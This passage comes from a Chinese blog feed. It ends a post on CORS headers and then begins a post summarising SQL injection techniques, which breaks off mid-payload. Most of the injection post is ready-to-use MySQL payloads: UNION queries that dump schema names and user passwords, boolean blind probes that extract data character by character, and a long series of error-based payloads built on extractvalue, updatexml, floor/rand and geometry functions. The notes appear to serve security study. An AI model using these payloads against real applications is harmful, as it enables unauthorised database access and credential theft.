title="HTTP响应首部字段"></a>HTTP响应首部字段</h2><h3 id="Access-Control-Allow-Origin"><a href="#Access-Control-Allow-Origin" class="headerlink" title="Access-Control-Allow-Origin"></a>Access-Control-Allow-Origin</h3><p>响应首部中可以携带一个Access-Control-Allow-Origin 字段，其语法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: &lt;origin&gt; | *</span><br></pre></td></tr></table></figure><p>其中，origin参数的值指定了允许访问该资源的外域URI。对于不需要携带身份凭证的请求，服务器可以指定该字段的值为通配符，表示允许来自所有域的请求。</p><p>例如，下面的字段值将允许来自<a href="http://mozilla.com/">http://mozilla.com</a> 的请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;mozilla.com</span><br></pre></td></tr></table></figure><p>如果服务端指定了具体的域名而非“*”，那么响应首部中的Vary字段的值必须包含Origin。这将告诉客户端：服务器对不同的源站返回不同的内容。</p><h3 id="Access-Control-Expose-Headers"><a href="#Access-Control-Expose-Headers" class="headerlink" title="Access-Control-Expose-Headers"></a><strong>Access-Control-Expose-Headers</strong></h3><p>在跨源访问时，XMLHttpRequest对象的getResponseHeader()方法只能拿到一些最基本的响应头，Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma，如果要访问其他头，则需要服务器设置本响应头。</p><p><code>[Access-Control-Expose-Headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Expose-Headers)</code> 头让服务器把允许浏览器访问的头放入白名单，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样浏览器就能够通过getResponseHeader访问<code>X-My-Custom-Header</code>和 <code>X-Another-Custom-Header</code> 响应头了。</p><h3 id="Access-Control-Max-Age"><a href="#Access-Control-Max-Age" class="headerlink" title="Access-Control-Max-Age"></a>Access-Control-Max-Age</h3><p><code>[Access-Control-Max-Age](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Max-Age)</code> 头指定了preflight请求的结果能够被缓存多久，请参考本文在前面提到的preflight例子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Max-Age: &lt;delta-seconds&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>delta-seconds</code> 参数表示preflight请求的结果在多少秒内有效。</p><h3 id="Access-Control-Allow-Credentials"><a href="#Access-Control-Allow-Credentials" class="headerlink" title="Access-Control-Allow-Credentials"></a>Access-Control-Allow-Credentials</h3><p><code>[Access-Control-Allow-Credentials](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials)</code> 头指定了当浏览器的<code>credentials</code>设置为true时是否允许浏览器读取response的内容。当用在对preflight预检测请求的响应中时，它指定了实际的请求是否可以使用<code>credentials</code>。请注意：简单 GET 请求不会被预检；如果对此类请求的响应中不包含该字段，这个响应将被忽略掉，并且浏览器也不会将相应内容返回给网页。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上文已经讨论了<a href="https://developer.mozilla.org/zh-CN/docs/web/http/CORS#requests_with_credentials">附带身份凭证的请求</a>。</p><h3 id="Access-Control-Allow-Methods"><a href="#Access-Control-Allow-Methods" class="headerlink" title="Access-Control-Allow-Methods"></a>Access-Control-Allow-Methods</h3><p><code>[Access-Control-Allow-Methods](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Methods)</code> 首部字段用于预检请求的响应。其指明了实际请求所允许使用的 HTTP 方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]*</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相关示例见<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS$edit#Preflighted_requests">这里</a>。</p><h3 id="Access-Control-Allow-Headers"><a href="#Access-Control-Allow-Headers" class="headerlink" title="Access-Control-Allow-Headers"></a>Access-Control-Allow-Headers</h3><p><code>[Access-Control-Allow-Headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Headers)</code> 首部字段用于预检请求的响应。其指明了实际请求中允许携带的首部字段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</span><br></pre></td></tr></table></figure><h2 id="HTTP请求首部字段"><a href="#HTTP请求首部字段" class="headerlink" title="HTTP请求首部字段"></a>HTTP请求首部字段</h2><p>这些首部字段无须手动设置，当使用XMLHttpRequest对象发起跨源请求时，它们已经被设置就绪。</p><h3 id="Origin"><a href="#Origin" class="headerlink" title="Origin"></a>Origin</h3><p>Origin首部字段表明预检请求或实际请求的源站。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Origin:&lt;origin&gt;</span><br></pre></td></tr></table></figure><p>origin的参数值为源站的URI，它不用包含任意路径信息，它只是服务器名称。</p><p><strong>注意：</strong>有时候将该字段的值设置为空字符是一样有用可以生效的，例如当源站是一个data URL时</p><p><strong>注意：</strong>在所有访问控制请求中，Origin首部字段总是被发送。</p><h3 id="Access-Control-Request-Method"><a href="#Access-Control-Request-Method" class="headerlink" title="Access-Control-Request-Method"></a>Access-Control-Request-Method</h3><p><code>[Access-Control-Request-Method](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Request-Method)</code> 首部字段用于预检请求。其作用是，将实际请求所使用的 HTTP 方法告诉服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Request-Method: &lt;method&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相关示例见<a href="https://developer.mozilla.org/zh-CN/docs/web/http/CORS#preflighted_requests">这里</a>。</p><h3 id="Access-Control-Request-Headers"><a href="#Access-Control-Request-Headers" class="headerlink" title="Access-Control-Request-Headers"></a>Access-Control-Request-Headers</h3><p><code>[Access-Control-Request-Headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Request-Headers)</code> 首部字段用于预检请求。其作用是，将实际请求所携带的首部字段告诉服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;同源策略和CORS&quot;&gt;&lt;a href=&quot;#同源策略和CORS&quot; class=&quot;headerlink&quot; title=&quot;同源策略和CORS&quot;&gt;&lt;/a&gt;同源策略和CORS&lt;/h1&gt;&lt;h1 id=&quot;同源策略&quot;&gt;&lt;a href=&quot;#同源策略&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="web" scheme="http://www.fxizenta.design/categories/web/"/>
    
    <category term="域的问题" scheme="http://www.fxizenta.design/categories/web/%E5%9F%9F%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    
    
    <category term="前端" scheme="http://www.fxizenta.design/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>sql注入总结(补充更新中)</title>
    <link href="http://www.fxizenta.design/2021/04/17/sqli/"/>
    <id>http://www.fxizenta.design/2021/04/17/sqli/</id>
    <published>2021-04-17T08:52:02.149Z</published>
    <updated>2021-07-27T13:10:06.138Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql注入总结"><a href="#sql注入总结" class="headerlink" title="sql注入总结"></a>sql注入总结</h1><p>2021/4/19 首发</p><p>2021/5/29 对报错注入、二次注入、bypass有所补充，新增宽字节注入</p><h1 id="0x00注入原理"><a href="#0x00注入原理" class="headerlink" title="0x00注入原理"></a>0x00注入原理</h1><p>SQL注入主要通过闭合字符串，注释后续本来为命令的一部分字符改变为文本的方式来对sql语句进行拼接达到执行任意sql命令的目的</p><p>SQL注入式攻击的主要形式有两种。一是直接将代码插入到与SQL命令串联在一起并使得其以执行的用户输入变量。二是一种间接的攻击方法，它将恶意代码注入要在表中存储或者作为原书据存储的字符串。在再次查询时，存储的字符串会连接到一个SQL命令中，执行一些注入者想要的恶意的QL代码(这种注入方式一般被称为二次注入)。</p><h1 id="0x01注入类型的判断"><a href="#0x01注入类型的判断" class="headerlink" title="0x01注入类型的判断"></a>0x01注入类型的判断</h1><h2 id="按变量类型分类"><a href="#按变量类型分类" class="headerlink" title="按变量类型分类"></a>按变量类型分类</h2><h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><p>可以进行?id=3-1进行测试，如果回显结果是?id=2的回显的话，那说明注入点为数字型</p><h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><p>可以进行?id=2a进行测试，如果回显结果是?id=2的回显的话，那说明注入点为字符型</p><h1 id="0x02判断后台数据库种类"><a href="#0x02判断后台数据库种类" class="headerlink" title="0x02判断后台数据库种类"></a>0x02判断后台数据库种类</h1><p>其中mysql最为常见</p><h3 id="根据操作系统平台"><a href="#根据操作系统平台" class="headerlink" title="根据操作系统平台"></a><strong>根据操作系统平台</strong></h3><p><strong>sql server</strong>：Windows（IIS)</p><p><strong>MySQL</strong>：Apache</p><h3 id="根据web语言"><a href="#根据web语言" class="headerlink" title="根据web语言"></a><strong>根据web语言</strong></h3><p><strong>Microsoft SQL Server</strong>：ASP和.Net</p><p><strong>MySQL</strong>：PHP</p><p><strong>Oracle/MySQL</strong>：java</p><p>以下以mysql数据库为主</p><h1 id="0x03手工注入"><a href="#0x03手工注入" class="headerlink" title="0x03手工注入"></a>0x03手工注入</h1><p>MySQL版本大于5.0和小于5.0的注入流程区别比较大，下午主要以大于5.0版本为主</p><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><p>信息数据库</p><p><strong>information_schema（after mysql 5.0)</strong></p><p>系统数据库，记录当前数据库的数据库，表，列，用户权限等信息</p><p><strong>SCHEMATA</strong></p><p>储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等</p><p><strong>TABLES</strong></p><p>储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等</p><p><strong>COLUMNS</strong></p><p>储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等</p><p><strong>length(str)</strong> ：返回字符串str的长度</p><p><strong>substr(str, pos, len)</strong> ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p><p><strong>mid(str,pos,len)</strong> ：跟上面的一样，截取字符串</p><p><strong>ascii(str)</strong> ：返回字符串str的最左面字符的ASCII代码值</p><p><strong>ord(str)</strong> ：将字符或布尔类型转成ascll码</p><p><strong>if(a,b,c)</strong> ：a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</p><h2 id="基本流程思路"><a href="#基本流程思路" class="headerlink" title="基本流程思路"></a>基本流程思路</h2><h3 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数字型：id<span class="operator">=</span><span class="number">2</span><span class="number">-1</span></span><br><span class="line">字符型：<span class="string">&#x27; 、&#x27;</span>)、 <span class="string">&#x27;))、 &quot;、 &quot;)、 &quot;))</span></span><br><span class="line"><span class="string">注释符：-- （这是--空格）、--+、/**/、#</span></span><br></pre></td></tr></table></figure><h3 id="2-获取字段数和观察页面回显的字段处"><a href="#2-获取字段数和观察页面回显的字段处" class="headerlink" title="2.获取字段数和观察页面回显的字段处"></a>2.获取字段数和观察页面回显的字段处</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> n</span><br></pre></td></tr></table></figure><h3 id="3-获取数据库名"><a href="#3-获取数据库名" class="headerlink" title="3.获取数据库名"></a>3.获取数据库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,database() </span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> group_concat(schema_name)<span class="keyword">from</span> information schema.schemata),</span><br></pre></td></tr></table></figure><h3 id="4-获取表名"><a href="#4-获取表名" class="headerlink" title="4.获取表名"></a>4.获取表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables),<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="5-获取表中的字段"><a href="#5-获取表中的字段" class="headerlink" title="5.获取表中的字段"></a>5.获取表中的字段</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,...,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;xxxxxxxx&#x27;</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns),<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="6-获取各个字段的具体值"><a href="#6-获取各个字段的具体值" class="headerlink" title="6.获取各个字段的具体值"></a>6.获取各个字段的具体值</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">null</span>,group_concat(username,password) <span class="keyword">from</span> xxxxxxx</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span>(<span class="keyword">select</span> group_concat(id,<span class="string">&#x27;~&#x27;</span>,uname)<span class="keyword">from</span> test.users),<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="常见的注入方法"><a href="#常见的注入方法" class="headerlink" title="常见的注入方法"></a>常见的注入方法</h2><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><p>主要用于注释后续代码为注释文本</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># <span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="comment">--(空格)或--+</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">/*!...*/</span></span><br></pre></td></tr></table></figure><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p><strong>user() ：</strong>当前使用者的用户名</p><p><strong>database()：</strong>当前数据库名</p><p><strong>version()：</strong>数据库版本</p><p><strong>datadir：</strong>读取数据库的绝对路径<strong>@@vasedir：</strong>mysql安装路径<strong>@@version_compile_os：</strong>操作系统<strong>concat()：</strong>连接一个或者多个字符串<strong>group_concat()：</strong>连接一个组的所有字符串，并以逗号分隔每一条数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">xx<span class="string">&#x27; union select 1,(select database()) #</span></span><br><span class="line"><span class="string">xx&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="keyword">select</span> database()),<span class="number">2</span> <span class="keyword">or</span> <span class="string">&#x27;　　　　　　//这里如果把查询语句放到2的位置上，因为or的关系会不能显示正常查询的内容</span></span><br></pre></td></tr></table></figure><h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><p>当查询页面会根据查询的成功和失败出现两种不同页面时可以考虑使用bool注入</p><p><strong>常用函数</strong></p><p>1.char() 解ASCII码;</p><p>2.mid()截取字符串;</p><p>举例：mid(‘hello’,1,3)，从第1位开始截取3位，输出位hel</p><p>3.substr()与mid()相同，都为截取字符串;</p><p>4.count()计算查询结果的行数;</p><p>5.concat()查询结果合并但保持原有行数;</p><p>6.group_concat()查询结果合并但都放在一行中;</p><p>7.ascii() 查询ascii码;</p><p>猜数据库长度(利用二分法);</p><ul><li>id=1 and (length(database()))&gt;1</li><li>id=1 and (length(database()))&gt;50</li></ul><p>猜第一个字符，第二个字符，以此类推</p><ul><li>and ascii(mid(database(),1,1))&gt;1</li><li>and ascii(mid(database(),2,1))&gt;1</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; substr(database(),1,1)=&#x27;</span>t<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p>查询当前数据库中所有表名;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> tables_schema<span class="operator">=</span>database())<span class="operator">&gt;</span><span class="number">1</span><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> tables_schema<span class="operator">=</span>database())<span class="operator">&gt;</span><span class="number">10</span></span><br></pre></td></tr></table></figure><p>查询第一个表的长度;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> length(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> tables_schema<span class="operator">=</span>database()limit <span class="number">0</span>,<span class="number">1</span>)<span class="operator">&gt;</span><span class="number">10</span></span><br></pre></td></tr></table></figure><p>查询表的第一个字符;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>查询atelier表里有几个字段;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> <span class="built_in">count</span>(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;atelier&#x27;</span> <span class="keyword">and</span> table_schema <span class="operator">=</span> database())<span class="operator">&gt;</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>查询第一个字段长度;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;atelier&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span> database()limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>查询字段第一个字符;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(mid((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27;db83231_asfaa&#x27;</span> <span class="keyword">and</span> TABLE_NAME <span class="operator">=</span><span class="string">&#x27;atelier&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">105</span></span><br></pre></td></tr></table></figure><p>查询字段所有行数;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> db83231_asfaa.atelier)<span class="operator">&gt;</span><span class="number">4</span></span><br></pre></td></tr></table></figure><p>查询字段名的行数（查询emails表，uname字段）;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(uname)<span class="keyword">from</span> security.emails)<span class="operator">&gt;</span><span class="number">7</span> 查询uname的行数</span><br></pre></td></tr></table></figure><p>查询字段内容;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length((<span class="keyword">select</span> username <span class="keyword">from</span> security.users limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">10</span>ascii(mid((<span class="keyword">select</span> username <span class="keyword">from</span> security.user limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>前提是后端有Exception这种异常处理的回显才能使用，不然即使能报错你也看不到回显。</p><h4 id="floor-和rand"><a href="#floor-和rand" class="headerlink" title="floor()和rand()"></a><strong>floor()和rand()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),<span class="number">2</span>,concat(<span class="string">&#x27;:&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;:&#x27;</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a       <span class="comment">/*利用错误信息得到当前数据库名*/</span></span><br></pre></td></tr></table></figure><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a><strong>extractvalue()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)))</span><br></pre></td></tr></table></figure><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a><strong>updatexml()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h4 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a><strong>geometrycollection()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h4 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a><strong>multipoint()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a><strong>polygon()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h4 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon()"></a><strong>multipolygon()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h4 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a><strong>linestring()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h4 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a><strong>multilinestring()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a><strong>exp()</strong></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))</span><br></pre></td></tr></table></figure><h4 id="其他引出报错的方法"><a href="#其他引出报错的方法" class="headerlink" title="其他引出报错的方法"></a><strong>其他引出报错的方法</strong></h4><p>在information_schema等被过滤的前提下，可以使用以下方法绕过并引发报错</p><p>爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="operator">-</span>a();</span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span 